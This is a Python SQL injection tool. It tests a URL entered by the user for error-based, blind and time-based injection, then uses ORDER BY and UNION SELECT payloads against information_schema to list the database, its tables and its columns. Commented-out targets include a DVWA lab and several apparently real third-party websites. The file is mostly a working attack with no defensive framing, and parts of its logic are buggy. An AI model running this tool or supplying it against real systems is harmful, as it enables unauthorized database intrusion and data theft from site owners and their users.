import urllib.request 
import urllib.error 
import requests
import sys
import time
from urllib.parse import urlparse,urlunparse
import sys
import difflib
#req = 'http://192.168.43.172/dvwa/vulnerabilities/sqli/?id=1'
#req = 'http://ami.edu.pk/page.php?p_id=100'
#req = 'http://achromicpoint.com/past-event.php?id=186'
#req = 'https://dynamic-password.000webhostapp.com/index.php?id=1'
global query_url
global vuln_id
global req
req  = input("Enter the URL:\n")
def time_based(req):
        parse = urlparse(req)
        qur = parse.query+'--SLEEP(1)--+'
        parse = parse._replace(query=qur)
        url = urlunparse(parse)
        start = time.time()
        resp = urllib.request.urlopen(url)
        period = time.time() - start
        print(period)
        if period > 2.5:
                print("Given url is vulnerable to SQL Injection")
                perform(req)
        else:
                print("The given url is not vulnerable to Time based SQL attack")

def fetch(url=req,parameter=""):
        try:
                request = urllib.request.urlopen(url+str(parameter))
                body = request.read().decode('utf-8')
                body.strip().splitlines()
                #print(len(body))
                return body
        except urllib.error.URLError as e:
                if hasattr(e, 'reason'):
                        print('We failed to reach a server.')
                        print('Reason: ', e.reason)
                elif hasattr(e, 'code'):
                        print('The server couldn\'t fulfill the request.')
                        print('Error code: ', e.code)
                else:
                        print("Everything is fine")
        

def vuln_ids(url):
        print('*'*10)
        print('Finding the number of columns')
        print('*'*10)
        norm_body = fetch(url)
        for i in range(1,20):
                query = '%20order%20by%20'+str(i)+'--+'
                parse = urlparse(url)
                order = parse.query+query
                parse = parse._replace(query=order)
                parse_url = urlunparse(parse)
                body = fetch(parse_url)
                if len(body) < len(norm_body):
                        print("Number of columns present")
                        break
        return i

def vuln_colm(url,num_id):
        print('*'*10)
        global query_url
        print("Finding vulnerable columns")
        union = ['%20UNION%20SELECT%201']
        parse = urlparse(url)
        q = parse.query
        idn = q[q.find("=")+1:]
        quer_id = parse.query.replace(idn,"-"+str(idn))
        #print(quer_id)
        for i in range(2,num_id):
                union.append(str(i))
        union1 = ','.join(union)
        query_union = quer_id+union1+'--+'
        parse = parse._replace(query=query_union)
        query_url = urlunparse(parse)
        query_resp = fetch(query_url)
        norm_resp = fetch()
        with open("norm.txt",'w') as file1:
                file1.write(norm_resp)
        with open("vuln_id",'w') as file2:
                file2.write(query_resp)
        with open("norm.txt") as f1:
                f1_text = f1.read()
        with open("vuln_id") as f2:
                f2_text = f2.read()
        vuln_id = []
        for line in difflib.unified_diff(f1_text,f2_text, fromfile='norm.txt', tofile='vuln_id.txt',lineterm='',n=0):
                for prefix in ('---','+++','@@','-'):
                        if line.startswith(prefix):
                                break
                else:
                        vuln_id.append(line.strip('+'))
        print(vuln_id)
        print('*'*10)
        return vuln_id

def vul_db(url,vulner_id):
        for i in vulner_id:
            vul_db = []
            global query_url
            global vuln_id
            parse = urlparse(query_url)
            vul_query = parse.query.replace(i,'database()')
            qur = vul_query
            parse = parse._replace(query=qur)
            url = urlunparse(parse)
            fin1 = fetch(url)
            with open("vuln_db.txt","w") as file2:
                file2.write(fin1)
            with open("vuln_id.txt") as f1:
                f1_text = f1.read()
            with open("vuln_db.txt") as f2:
                f2_text = f2.read()
            for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_db.txt',tofile='vuln_id.txt', lineterm='',n=0):
                for prefix in ('---','+++','@@','-'):
                    if line.startswith(prefix):
                        break
                else:
                    #print(line)
                    vul_db.append(line.strip('+'))
            #print(''.join(vul_db))
            vuln_id = i
        vuln_db = ''.join(vul_db)
        return vuln_db

def table_name(url,db_name):
        parse = urlparse(query_url)
        vul_query = parse.query.replace(vuln_id,'GROUP_CONCAT(table_name)')
        parse = parse._replace(query=vul_query)
        print('*'*10)
        vul_query = parse.query.replace('--+','%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--+')
        parse = parse._replace(query=vul_query)
        url = urlunparse(parse)
        print('*'*10)
        fin2 = fetch(url)
        with open("tables.txt",'w') as file3:
            file3.write(fin2)
        with open("vuln_id.txt") as f1:
                f1_text = f1.read()
        with open("tables.txt") as f2:
                f2_text = f2.read()
        vuln_tbl = []
        for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_id.txt',tofile='tables.txt', lineterm='',n=0):
            for prefix in ('---','+++','@@','-'):
                if line.startswith(prefix):
                    break
            else:
                #print(line)
                vuln_tbl.append(line.strip('+'))

        tables = ''.join(vuln_tbl)
        #print(tables,type(tables))
        tab = tables.strip()
        tabl = tab.split(",")
        return tabl

def column_name(url,tab_name):
        parse = urlparse(query_url)
        vul_query = parse.query.replace(vuln_id,'GROUP_CONCAT(column_name)')
        parse = parse._replace(query=vul_query)
        print('*'*10)
        vul_query = parse.query.replace('--+','%20FROM%20information_schema.columns%20WHERE%20table_name=0x'+str(tab_name)+'%20--+')
        parse = parse._replace(query=vul_query)
        url = urlunparse(parse)
        fin3 =fetch(url)
        with open("columns.txt",'w') as file4:
            file4.write(fin3)
        with open("vuln_id.txt") as f1:
                f1_text = f1.read()
        with open("columns.txt") as f2:
                f2_text = f2.read()
        vuln_tbl = []
        for line in difflib.unified_diff(f1_text,f2_text, fromfile='vuln_id.txt',tofile='columns.txt', lineterm='',n=0):
            for prefix in ('---','+++','@@','-'):
                if line.startswith(prefix):
                    break
            else:
                #print(line)
                vuln_tbl.append(line.strip('+'))
        columns = ''.join(vuln_tbl)
        print('*'*10)
        col = columns.strip()
        colm = col.split(",")
        print('-'*20)
        for x in colm:
                print(x)
        print('-'*20)
        
                            
              
def error_based(url,body):
        fullbody = fetch(url)
        if len(fullbody) == len(body):
                return 0
        else:
                return 1

def blind_based(url):
        print('*'*10)
        print("Performing Blind SQL Injection")
        print('*'*10)
        num_colm = vuln_ids(url)
        print(num_colm)
        db_colm = vuln_colm(url,num_colm)
        db_name = vul_db(url,db_colm)
        print("Database present :"+str(db_name))
        tables = table_name(url,db_name)
        print("Select the table to extract data:\n")
        for i in tables:
            print(str(tables.index(i))+"-"+i)
        ind = int(input())
        table = tables[ind].encode("utf-8").hex()
        column_name(url,table)
        choice = int(input("1:Continue\n:2Exit"))
        if choice is 1:
                blind_based(url)
        else:
                sys.exit()
        
def perform(url):
        fullbody = fetch(url,"'")
        flag=error_based(url,fullbody)
        if "You have an error in your SQL syntax" in fullbody:
                print("The given url is vulnerable to error based SQL Injection")
        elif flag == 1:
                print("Given url is vulnerable to blind based SQL Injection")
        else:
                print("The webiste is not Vulnerable")
                sys.exit()
        print("*"*80)
        print("Type of attacks to perform")
        print("1:Time Based Attack\n2:Blind Based Attack")
        attack = int(input("Choose the Type:"))
        if attack is 1 :
                time_based(req)
        else :
                blind_based(req)

if __name__ == "__main__":
        try:
                #global req
                #req  = input("Enter the URL")
                response = urllib.request.urlopen(req)
                perform(req)
        except urllib.error.URLError as e:
                if hasattr(e, 'reason'):
                        print('We failed to reach a server.')
                        print('Reason: ', e.reason)             
                elif hasattr(e, 'code'):
                        print('The server couldn\'t fulfill the request.')
                        print('Error code: ', e.code)
                else:
                                print('everything is fine')     
                

'''
webUrl  = urllib.request.urlopen('https://www.youtube.com/user/guru99com')

#get the result code and print it
print ("result code: " + str(webUrl.getcode()))

# read the data from the URL and print it
data = webUrl.read()
print (data)
'''
        



        
